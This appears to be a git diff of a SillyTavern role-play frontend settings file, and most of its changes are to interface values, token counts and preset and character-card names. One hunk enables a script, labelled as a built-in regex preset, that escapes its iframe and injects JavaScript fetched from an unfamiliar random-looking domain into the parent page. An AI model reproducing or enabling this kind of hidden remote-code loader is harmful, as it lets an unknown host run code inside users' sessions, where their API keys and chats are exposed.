@@ -2,7 +2,7 @@
     "firstRun": false,
     "accountStorage": {
         "__migrated": "1",
-        "LNavOpened": "true",
+        "LNavOpened": "false",
         "AlertRegex_kobold_【MoM】梦梦DS1.1.11p丨喵喵电波@ameng": "true",
         "NavOpened": "true",
         "StoryStringValidationCache": "{\"hashCache\":{\"3090278210222208\":{\"fieldsWarned\":{}},\"1547467663366332\":{\"fieldsWarned\":{}}}}",
@@ -43,7 +43,7 @@
     },
     "currentVersion": "1.13.5",
     "username": "白云",
-    "active_character": "与青梅竹马打情骂俏的炮友日常-改.png",
+    "active_character": "穿越小马，拉的就是大车.png",
     "active_group": null,
     "user_avatar": "user-default.png",
     "amount_gen": 350,
@@ -248,7 +248,7 @@
         "avatar_style": 0,
         "chat_display": 0,
         "toastr_position": "toast-top-center",
-        "chat_width": 63,
+        "chat_width": 42,
         "never_resize_avatars": false,
         "show_card_avatar_urls": false,
         "play_message_sound": false,
@@ -774,7 +774,7 @@
                 "XP情境大全（需搭配全绿灯世界书-v1.4）",
                 "【狐】生成tag测试4(1)",
                 "知识库",
-                "夏瑾 Pro 0.7 deepseek"
+                "夏瑾 Pro - Beta 0.70"
             ]
         },
         "tts": {
@@ -969,8 +969,8 @@
             "global": {
                 "LAST_RECEIVE_TOKENS": 4,
                 "LAST_RECEIVE_CHARS": 2,
-                "LAST_SEND_TOKENS": 46599,
-                "LAST_SEND_CHARS": 80234,
+                "LAST_SEND_TOKENS": 44016,
+                "LAST_SEND_CHARS": 76320,
                 "content": "继续"
             }
         },
@@ -1091,7 +1091,7 @@
                 "scripts": [
                     {
                         "type": "script",
-                        "enabled": false,
+                        "enabled": true,
                         "name": "【SoliUmbra】预设内置正则 v2",
                         "id": "0da1e226-06d4-4ba7-83b4-0f640a00c1af",
                         "content": "function injectScript(iframe, id, url) {\n  /* inject a script into the parent window */\n  let parent = iframe.parentElement;\n  // go up until body\n  while (parent && parent.tagName !== 'BODY') {\n    parent = parent.parentElement;\n  }\n  console.log(parent);\n  // skip if script already exists\n  if (document.getElementById(id)) {\n    console.log('script already exists');\n    return;\n  }\n  const script = document.createElement('script');\n  script.id = id;\n  script.src = url;\n  parent.appendChild(script);\n}\n\n\n$(() => {\n  SillyTavern.extensionSettings.regexBinding_scriptId = getScriptId();\n  injectScript(window.frameElement, getScriptId(), 'https://jnai2d9kgnbs6xzx5c.com/regex_bind/inject.js');\n});",
@@ -2023,7 +2023,7 @@
         }
     },
     "oai_settings": {
-        "preset_settings_openai": "夏瑾 Pro 0.7 deepseek",
+        "preset_settings_openai": "夏瑾 Pro - Beta 0.70",
         "temp_openai": 1.01,
         "freq_pen_openai": 0,
         "pres_pen_openai": 0,
